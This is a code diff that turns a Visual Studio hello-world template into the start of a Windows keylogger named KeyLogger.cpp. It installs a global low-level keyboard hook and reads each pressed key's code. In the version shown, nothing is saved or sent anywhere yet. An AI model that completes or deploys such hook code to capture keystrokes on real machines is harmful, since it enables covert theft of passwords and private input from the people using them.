@@ -1,20 +1,33 @@
-// KeyLogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
-//
-
+#include <fstream>
 #include <iostream>
+#include <windows.h>
+
+HHOOK* hook;
+
+LRESULT CALLBACK KeyLogger(int code, WPARAM wParam, LPARAM lParam) {
+    KBDLLHOOKSTRUCT* vhStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
+    int virtualKey = vhStruct->vkCode;
+
+    //std::cout << virtualKey << std::endl;
+
+
+    return CallNextHookEx(*hook,code,wParam,lParam);
+}
+
+
 
 int main()
 {
-    std::cout << "Hello World!\n";
+    std::cout << "Project startup\n";
+
+    hook = new HHOOK();
+    *hook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyLogger, GetModuleHandle(nullptr), 0);
+
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0) > 0) {
+        if (GetAsyncKeyState('P') && GetAsyncKeyState('T'))
+            std::cout << "t" << std::endl;
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
 }
-
-// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
-// Debug program: F5 or Debug > Start Debugging menu
-
-// Tips for Getting Started: 
-//   1. Use the Solution Explorer window to add/manage files
-//   2. Use the Team Explorer window to connect to source control
-//   3. Use the Output window to see build output and other messages
-//   4. Use the Error List window to view errors
-//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
-//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
